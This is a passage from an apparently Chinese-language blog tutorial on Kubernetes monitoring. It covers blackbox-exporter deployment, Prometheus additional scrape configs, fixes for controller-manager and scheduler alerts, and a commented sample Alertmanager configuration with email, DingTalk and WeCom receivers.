class="attr">metadata:</span></span><br><span class="line">      <span class="attr">creationTimestamp:</span> <span class="literal">null</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">blackbox-exporter</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">args:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">--config.file=/mnt/blackbox.yml</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">prom/blackbox-exporter:master</span></span><br><span class="line">        <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">blackbox-exporter</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">9115</span></span><br><span class="line">          <span class="attr">name:</span> <span class="string">web</span></span><br><span class="line">          <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">        <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/mnt</span></span><br><span class="line">          <span class="attr">name:</span> <span class="string">config</span></span><br><span class="line">      <span class="attr">restartPolicy:</span> <span class="string">Always</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">configMap:</span></span><br><span class="line">          <span class="attr">defaultMode:</span> <span class="number">420</span></span><br><span class="line">          <span class="attr">name:</span> <span class="string">blackbox-conf</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">config</span></span><br><span class="line">        </span><br><span class="line">  <span class="comment">#service</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">blackbox-exporter</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">blackbox-exporter</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">monitoring</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">container-1-web-1</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">9115</span></span><br><span class="line">    <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">    <span class="attr">targetPort:</span> <span class="number">9115</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">blackbox-exporter</span></span><br><span class="line">  <span class="attr">sessionAffinity:</span> <span class="string">None</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">ClusterIP</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">#查看svc</span></span><br><span class="line">  <span class="string">访问测试</span></span><br><span class="line">   <span class="string">curl</span> <span class="string">&quot;http://10.102.165.69:9115/probe?target=www.baidu.com&amp;module=http_2xx&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="②prometheus-additional传统配置"><a href="#②prometheus-additional传统配置" class="headerlink" title="②prometheus_additional传统配置"></a>②prometheus_additional传统配置</h4><p>用来收集监控blackbox的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/prometheus/blackbox_exporter</span><br><span class="line">https://github.com/prometheus/blackbox_exporter/blob/master/blackbox.yml</span><br><span class="line">https://grafana.com/grafana/dashboards/5345</span><br></pre></td></tr></table></figure>

<p>创建secrets</p>
<p>（官方地址：<a href="https://github.com/prometheus-operator/prometheus-operator/blob/master/Documentation/additional-scrape-config.md%EF%BC%89">https://github.com/prometheus-operator/prometheus-operator/blob/master/Documentation/additional-scrape-config.md）</a></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">cat</span> <span class="string">prometheus-additional.yaml</span></span><br><span class="line"> </span><br><span class="line"><span class="bullet">-</span> <span class="attr">job_name:</span> <span class="string">&#x27;blackbox&#x27;</span></span><br><span class="line">  <span class="attr">metrics_path:</span> <span class="string">/probe</span></span><br><span class="line">  <span class="attr">params:</span></span><br><span class="line">    <span class="attr">module:</span> [<span class="string">http_2xx</span>]  <span class="comment"># Look for a HTTP 200 response.</span></span><br><span class="line">  <span class="attr">static_configs:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">targets:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">http://www.baidu.com</span>	  <span class="comment"># 这里我们监控百度网站测试</span></span><br><span class="line">  <span class="attr">relabel_configs:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">source_labels:</span> [<span class="string">__address__</span>]</span><br><span class="line">      <span class="attr">target_label:</span> <span class="string">__param_target</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">source_labels:</span> [<span class="string">__param_target</span>]</span><br><span class="line">      <span class="attr">target_label:</span> <span class="string">instance</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">target_label:</span> <span class="string">__address__</span></span><br><span class="line">      <span class="attr">replacement:</span> <span class="string">blackbox-exporter:9115</span>  <span class="comment"># The blackbox exporter&#x27;s real hostname:port.</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl create secret generic additional-scrape-configs --from-file=prometheus-additional.yaml --dry-run -oyaml &gt; additional-scrape-configs.yaml</span><br><span class="line"> </span><br><span class="line">kubectl apply -f additional-scrape-configs.yaml -n monitoring </span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>修改Prometheus的CRD</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@k8s-master01 manifests]# vim prometheus-prometheus.yaml </span><br><span class="line"> </span><br><span class="line">apiVersion: monitoring.coreos.com/v1</span><br><span class="line">kind: Prometheus</span><br><span class="line">metadata:</span><br><span class="line">  labels:</span><br><span class="line">    prometheus: k8s</span><br><span class="line">spec:</span><br><span class="line">  alerting:</span><br><span class="line">    alertmanagers:</span><br><span class="line">    - name: alertmanager-main</span><br><span class="line">      namespace: monitoring</span><br><span class="line">      port: web</span><br><span class="line">  image: quay.io/prometheus/prometheus:v2.15.2</span><br><span class="line">  nodeSelector:</span><br><span class="line">    kubernetes.io/os: linux</span><br><span class="line">  podMonitorNamespaceSelector: &#123;&#125;</span><br><span class="line">  podMonitorSelector: &#123;&#125;</span><br><span class="line">  replicas: 1</span><br><span class="line">  resources:</span><br><span class="line">    requests:</span><br><span class="line">      memory: 700Mi</span><br><span class="line">  ruleSelector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      prometheus: k8s</span><br><span class="line">      role: alert-rules</span><br><span class="line">  securityContext:</span><br><span class="line">    fsGroup: 2000</span><br><span class="line">    runAsNonRoot: true</span><br><span class="line">    runAsUser: 1000</span><br><span class="line">  serviceAccountName: prometheus-k8s</span><br><span class="line">  serviceMonitorNamespaceSelector: &#123;&#125;</span><br><span class="line">  serviceMonitorSelector: &#123;&#125;</span><br><span class="line">  version: v2.15.2</span><br><span class="line">  additionalScrapeConfigs:</span><br><span class="line">    name: additional-scrape-configs</span><br><span class="line">    key: prometheus-additional.yaml</span><br><span class="line"> </span><br><span class="line">[root@k8s-master01 manifests]# kubectl replace -f prometheus-prometheus.yaml </span><br><span class="line">prometheus.monitoring.coreos.com/k8s replaced</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20220911162455295.png" alt="image-20220911162455295"></p>
<p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20220911162515782.png" alt="image-20220911162515782"></p>
<h2 id="三-prometheus报错问题"><a href="#三-prometheus报错问题" class="headerlink" title="三.prometheus报错问题"></a>三.prometheus报错问题</h2><p><strong>KubeControllerManagerDown</strong> 和<strong>KubeSchedulerDown</strong></p>
<p><strong>原因一：prometheus无法访问kube-controll，kube-schedule</strong></p>
<p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20220909151519767.png" alt="image-20220909151519767"></p>
<p><strong>原因二：servicemonitor中的kube-controller-manager的标签在kube-system的svc中找不到对应的标签</strong></p>
<p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20220909152525001.png" alt="image-20220909152525001"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看标签</span></span><br><span class="line">kubectl get servicemonitor -n monitoring kube-controller-manager -o yaml</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">检查kube-system中是否有该标签</span></span><br><span class="line">kubectl get svc -n kube-system -l k8s-app=kube-controller-manager</span><br></pre></td></tr></table></figure>

<p>解决方法 </p>
<p><strong>将地址改为0.0.0.0</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/kubernetes/manifests/kube-controller-manager.yaml</span><br><span class="line">vi /etc/kubernetes/manifests/kube-scheduler.yaml</span><br><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure>

<p><strong>创建svc，endpoint</strong></p>
<p>kube-controller-manager.yaml</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kube-controller-manager</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">kube-controller-manager</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">ClusterIP</span></span><br><span class="line">  <span class="attr">clusterIP:</span> <span class="string">None</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">http-metrics</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">10257</span></span><br><span class="line">    <span class="attr">targetPort:</span> <span class="number">10257</span></span><br><span class="line">    <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Endpoints</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kube-controller-manager</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">kube-controller-manager</span></span><br><span class="line"><span class="attr">subsets:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">addresses:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">ip:</span> <span class="number">192.168</span><span class="number">.200</span><span class="number">.155</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">http-metrics</span></span><br><span class="line">      <span class="attr">port:</span> <span class="number">10257</span></span><br><span class="line">      <span class="attr">protocol:</span> <span class="string">TCP</span></span><br></pre></td></tr></table></figure>

<p>kube-scheduler.yaml</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kube-scheduler</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">kube-scheduler</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">ClusterIP</span></span><br><span class="line">  <span class="attr">clusterIP:</span> <span class="string">None</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">http-metrics</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">10259</span></span><br><span class="line">    <span class="attr">targetPort:</span> <span class="number">10259</span></span><br><span class="line">    <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Endpoints</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kube-scheduler</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">kube-scheduler</span></span><br><span class="line"><span class="attr">subsets:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">addresses:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">ip:</span> <span class="number">172.16</span><span class="number">.1</span><span class="number">.71</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">http-metrics</span></span><br><span class="line">      <span class="attr">port:</span> <span class="number">10259</span></span><br><span class="line">      <span class="attr">protocol:</span> <span class="string">TCP</span></span><br></pre></td></tr></table></figure>

<p>补充：查看kubeadm的token</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl get secret -n kube-system</span><br><span class="line">kubectl  describe  secret -n kube-system attachdetach-controller-token-85hdj </span><br></pre></td></tr></table></figure>

<h2 id="四-没有metrics接口（监控kafka）"><a href="#四-没有metrics接口（监控kafka）" class="headerlink" title="四.没有metrics接口（监控kafka）"></a>四.没有metrics接口（监控kafka）</h2><p>部署deployment</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">vi</span> <span class="string">kafka.yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kafka</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">k8s-app:</span> <span class="string">kafka</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">k8s-app:</span> <span class="string">kafka</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">kafka</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">bitnami/kafka</span></span><br><span class="line">        <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">        <span class="attr">command:</span> [<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-ce&quot;</span>, <span class="string">&quot;tail -f /dev/null&quot;</span>]</span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">9092</span></span><br></pre></td></tr></table></figure>

<h1 id="Alertmanager告警-系统整合"><a href="#Alertmanager告警-系统整合" class="headerlink" title="Alertmanager告警 系统整合"></a>Alertmanager告警 系统整合</h1><h2 id="一-工作机制"><a href="#一-工作机制" class="headerlink" title="一.工作机制"></a>一.工作机制</h2><p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20220912091238476.png" alt="image-20220912091238476"></p>
<p>alertmanager-arch</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在Prometheus生态架构里，警报是由独立的俩部分组成，可以通过上图很清晰的了解到 Prometheus 的警报工作机制。其中Prometheus与 Alertmanager 是分离的俩个组件。我们使用Prometheus Server端通过静态或者动态配置</span><br><span class="line">去拉取 pull 部署在k8s或云主机上的各种类别的监控指标数据，然后基于我们前面讲到的 PromQL 对这些已经存储在本地存储 HDD/SSD 的 TSDB 中的指标定义阈值警报规则 Rules。Prometheus会根据配置的参数周期性的对警报规则进行计算，</span><br><span class="line">如果满足警报条件，生产一条警报信息，将其推送到 Alertmanager 组件，Alertmanager 收到警报信息之后，会对警告信息进行处理，进行 **分组** Group 并将它们通过定义好的路由 Routing 规则转到 正确的接收器 receiver，</span><br><span class="line">比如 Email Slack 钉钉、企业微信 Robot（webhook） 企业微信 等，最终异常事件 Warning、Error通知给定义好的接收人，其中如钉钉是基于第三方通知来实现的，对于通知人定义是在钉钉的第三方组件中配置。</span><br><span class="line"></span><br><span class="line">在 Prometheus 中， 我们不仅仅可以对单条警报进行命名通过 PromQL定义规则，更多时候是对相关的多条警报进行分组后统一定义。</span><br></pre></td></tr></table></figure>

<p>模板：<a href="#email_config">https://prometheus.io/docs/alerting/configuration/#email_config</a></p>
<h2 id="二-Altermanager的4个概念"><a href="#二-Altermanager的4个概念" class="headerlink" title="二.Altermanager的4个概念"></a>二.Altermanager的4个概念</h2><p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20220912091807849.png" alt="image-20220912091807849"></p>
<h3 id="分组-Grouping"><a href="#分组-Grouping" class="headerlink" title="分组(Grouping)"></a>分组(Grouping)</h3><p><code>　　Grouping</code> 是 <strong>Alertmanager</strong> 把同类型的警报进行分组，合并多条警报到一个通知中。在生产环境中，特别是云环境下的业务之间密集耦合时，若出现多台 Instance 故障，可能会导致成千上百条警报触发。在这种情况下使用分组机制，<br>可以把这些被触发的警报合并为一个警报进行通知，从而避免瞬间突发性的接受大量警报通知，使得管理员无法对问题进行快速定位。</p>
<p>举个栗子，在Kubernetes集群中，运行着重量级规模的实例，即便是集群中持续很小一段时间的网络延迟或者延迟导致网络抖动，也会引发大量类似服务应用无法连接 <code>DB</code> 的故障。如果在警报规则中定义每一个应用实例都发送警报，那么到最后的结果就是<br>会有大量的警报信息发送给 <strong>Alertmanager</strong> 。</p>
<p>作为运维组或者相关业务组的开发人员，可能更关心的是在一个通知中就可以快速查看到哪些服务实例被本次故障影响了。为此，我们对服务所在集群或者服务警报名称的维度进行分组配置，把警报汇总成一条通知时，就不会受到警报信息的频繁发送影响了。</p>
<h3 id="抑制-Inhivition"><a href="#抑制-Inhivition" class="headerlink" title="抑制(Inhivition)"></a>抑制(Inhivition)</h3><p><code>　　Inhibition</code> 是 当某条警报已经发送，停止重复发送由此警报引发的其他异常或故障的警报机制。</p>
<p>　　在生产环境中，IDC托管机柜中，若每一个机柜接入层仅仅是单台交换机，那么该机柜接入交换机故障会造成机柜中服务器非 <code>up</code> 状态警报。再有服务器上部署的应用服务不可访问也会触发警报。</p>
<p>　　这时候，可以通过在 <strong>Alertmanager</strong> 配置忽略由于交换机故障而造成的此机柜中的所有服务器及其应用不可达而产生的警报。</p>
<p>在我们的灾备体系中，当原有集群故障宕机业务彻底无法访问的时候，会把用户流量切换到备份集群中，这样为故障集群及其提供的各个微服务状态发送警报机会失去了意义，此时， <strong>Alertmanager</strong> 的抑制特性就可以在一定程度上避免管理员收到过多无用的警报通知。</p>
<h3 id="静默-Silences"><a href="#静默-Silences" class="headerlink" title="静默(Silences)"></a>静默(Silences)</h3><p><code>　　Silences</code> 提供了一个简单的机制，根据标签快速对警报进行静默处理；对传进来的警报进行匹配检查，如果接受到警报符合静默的配置，<strong>Alertmanager</strong> 则不会发送警报通知。</p>
<p>以上除了分组、抑制是在 <strong>Alertmanager</strong> 配置文件中配置，静默是需要在 WEB UI 界面中设置临时屏蔽指定的警报通知。</p>
<h3 id="路由-router"><a href="#路由-router" class="headerlink" title="路由(router)"></a>路由(router)</h3><p>　用于配置 Alertmanager 如何处理传入的特定类型的告警通知，其基本逻辑是根据路由匹配规则的匹配结果来确定处理当前报警通知的路径和行为</p>
<h2 id="三-范例"><a href="#三-范例" class="headerlink" title="三.范例"></a>三.范例</h2><p>Alertmanager完整配置文件范例：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">## Alertmanager 配置文件</span></span><br><span class="line"><span class="attr">global:</span></span><br><span class="line">  <span class="attr">resolve_timeout:</span> <span class="string">5m</span></span><br><span class="line">  <span class="comment"># smtp配置</span></span><br><span class="line">  <span class="attr">smtp_from:</span> <span class="string">&quot;123456789@qq.com&quot;</span></span><br><span class="line">  <span class="attr">smtp_smarthost:</span> <span class="string">&#x27;smtp.qq.com:465&#x27;</span></span><br><span class="line">  <span class="attr">smtp_auth_username:</span> <span class="string">&quot;123456789@qq.com&quot;</span></span><br><span class="line">  <span class="attr">smtp_auth_password:</span> <span class="string">&quot;auth_pass&quot;</span></span><br><span class="line">  <span class="attr">smtp_require_tls:</span> <span class="literal">true</span></span><br><span class="line"><span class="comment"># email、企业微信的模板配置存放位置，钉钉的模板会单独讲如果配置。</span></span><br><span class="line"><span class="attr">templates:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;/data/alertmanager/templates/*.tmpl&#x27;</span></span><br><span class="line"><span class="comment"># 路由分组</span></span><br><span class="line"><span class="attr">route:</span></span><br><span class="line">  <span class="attr">receiver:</span> <span class="string">ops</span></span><br><span class="line">  <span class="attr">group_wait:</span> <span class="string">30s</span> <span class="comment"># 在组内等待所配置的时间，如果同组内，30秒内出现相同报警，在一个组内出现。</span></span><br><span class="line">  <span class="attr">group_interval:</span> <span class="string">5m</span> <span class="comment"># 如果组内内容不变化，合并为一条警报信息，5m后发送。</span></span><br><span class="line">  <span class="attr">repeat_interval:</span> <span class="string">24h</span> <span class="comment"># 发送报警间隔，如果指定时间内没有修复，则重新发送报警。</span></span><br><span class="line">  <span class="attr">group_by:</span> [<span class="string">alertname</span>]  <span class="comment"># 报警分组</span></span><br><span class="line">  <span class="attr">routes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">match:</span></span><br><span class="line">          <span class="attr">team:</span> <span class="string">operations</span></span><br><span class="line">        <span class="attr">group_by:</span> [<span class="string">env</span>,<span class="string">dc</span>]</span><br><span class="line">        <span class="attr">receiver:</span> <span class="string">&#x27;ops&#x27;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">match_re:</span></span><br><span class="line">          <span class="attr">service:</span> <span class="string">nginx|apache</span></span><br><span class="line">        <span class="attr">receiver:</span> <span class="string">&#x27;web&#x27;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">match_re:</span></span><br><span class="line">          <span class="attr">service:</span> <span class="string">hbase|spark</span></span><br><span class="line">        <span class="attr">receiver:</span> <span class="string">&#x27;hadoop&#x27;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">match_re:</span></span><br><span class="line">          <span class="attr">service:</span> <span class="string">mysql|mongodb</span></span><br><span class="line">        <span class="attr">receiver:</span> <span class="string">&#x27;db&#x27;</span></span><br><span class="line"><span class="comment"># 接收器</span></span><br><span class="line"><span class="comment"># 抑制测试配置</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">receiver:</span> <span class="string">ops</span></span><br><span class="line">        <span class="attr">group_wait:</span> <span class="string">10s</span></span><br><span class="line">        <span class="attr">match:</span></span><br><span class="line">          <span class="attr">status:</span> <span class="string">&#x27;High&#x27;</span></span><br><span class="line"><span class="comment"># ops</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">receiver:</span> <span class="string">ops</span> <span class="comment"># 路由和标签，根据match来指定发送目标，如果 rule的lable 包含 alertname， 使用 ops 来发送</span></span><br><span class="line">        <span class="attr">group_wait:</span> <span class="string">10s</span></span><br><span class="line">        <span class="attr">match:</span></span><br><span class="line">          <span class="attr">team:</span> <span class="string">operations</span></span><br><span class="line"><span class="comment"># web</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">receiver:</span> <span class="string">db</span> <span class="comment"># 路由和标签，根据match来指定发送目标，如果 rule的lable 包含 alertname， 使用 db 来发送</span></span><br><span class="line">        <span class="attr">group_wait:</span> <span class="string">10s</span></span><br><span class="line">        <span class="attr">match:</span></span><br><span class="line">          <span class="attr">team:</span> <span class="string">db</span></span><br><span class="line"><span class="comment"># 接收器指定发送人以及发送渠道</span></span><br><span class="line"><span class="attr">receivers:</span></span><br><span class="line"><span class="comment"># ops分组的定义</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">ops</span></span><br><span class="line">  <span class="attr">email_configs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">to:</span> <span class="string">&#x27;9935226@qq.com,10000@qq.com&#x27;</span></span><br><span class="line">    <span class="attr">send_resolved:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">headers:</span></span><br><span class="line">      <span class="attr">subject:</span> <span class="string">&quot;[operations] 报警邮件&quot;</span></span><br><span class="line">      <span class="attr">from:</span> <span class="string">&quot;警报中心&quot;</span></span><br><span class="line">      <span class="attr">to:</span> <span class="string">&quot;小煜狼皇&quot;</span></span><br><span class="line">  <span class="comment"># 钉钉配置</span></span><br><span class="line">  <span class="attr">webhook_configs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">url:</span> <span class="string">http://localhost:8070/dingtalk/ops/send</span></span><br><span class="line">    <span class="comment"># 企业微信配置</span></span><br><span class="line">  <span class="attr">wechat_configs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">corp_id:</span> <span class="string">&#x27;ww5421dksajhdasjkhj&#x27;</span></span><br><span class="line">    <span class="attr">api_url:</span> <span class="string">&#x27;https://qyapi.weixin.qq.com/cgi-bin/&#x27;</span></span><br><span class="line">    <span class="attr">send_resolved:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">to_party:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line">    <span class="attr">agent_id:</span> <span class="string">&#x27;1000002&#x27;</span></span><br><span class="line">    <span class="attr">api_secret:</span> <span class="string">&#x27;Tm1kkEE3RGqVhv5hO-khdakjsdkjsahjkdksahjkdsahkj&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># web</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">web</span></span><br><span class="line">  <span class="attr">email_configs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">to:</span> <span class="string">&#x27;9935226@qq.com&#x27;</span></span><br><span class="line">    <span class="attr">send_resolved:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">headers:</span> &#123; <span class="attr">Subject:</span> <span class="string">&quot;[web] 报警邮件&quot;</span>&#125; <span class="comment"># 接收邮件的标题</span></span><br><span class="line">  <span class="attr">webhook_configs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">url:</span> <span class="string">http://localhost:8070/dingtalk/web/send</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">url:</span> <span class="string">http://localhost:8070/dingtalk/ops/send</span></span><br><span class="line"><span class="comment"># db</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">db</span></span><br><span class="line">  <span class="attr">email_configs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">to:</span> <span class="string">&#x27;9935226@qq.com&#x27;</span></span><br><span class="line">    <span class="attr">send_resolved:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">headers:</span> &#123; <span class="attr">Subject:</span> <span class="string">&quot;[db] 报警邮件&quot;</span>&#125; <span class="comment"># 接收邮件的标题</span></span><br><span class="line">  <span class="attr">webhook_configs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">url:</span> <span class="string">http://localhost:8070/dingtalk/db/send</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">url:</span> <span class="string">http://localhost:8070/dingtalk/ops/send</span></span><br><span class="line"><span class="comment"># hadoop</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">hadoop</span></span><br><span class="line">  <span class="attr">email_configs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">to:</span> <span class="string">&#x27;9935226@qq.com&#x27;</span></span><br><span class="line">    <span class="attr">send_resolved:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">headers:</span> &#123; <span class="attr">Subject:</span> <span class="string">&quot;[hadoop] 报警邮件&quot;</span>&#125; <span class="comment"># 接收邮件的标题</span></span><br><span class="line">  <span class="attr">webhook_configs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">url:</span> <span class="string">http://localhost:8070/dingtalk/hadoop/send</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">url:</span> <span class="string">http://localhost:8070/dingtalk/ops/send</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 抑制器配置</span></span><br><span class="line"><span class="attr">inhibit_rules:</span> <span class="comment"># 抑制规则</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">source_match:</span> <span class="comment"># 源标签警报触发时抑制含有目标标签的警报，在当前警报匹配 status: &#x27;High&#x27;</span></span><br><span class="line">      <span class="attr">status:</span> <span class="string">&#x27;High&#x27;</span>  <span class="comment"># 此处的抑制匹配一定在最上面的route中配置不然，会提示找不key。</span></span><br><span class="line">    <span class="attr">target_match:</span></span><br><span class="line">      <span class="attr">status:</span> <span class="string">&#x27;Warning&#x27;</span> <span class="comment"># 目标标签值正则匹配，可以是正则表达式如: &quot;.*MySQL.*&quot;</span></span><br><span class="line">    <span class="attr">equal:</span> [<span 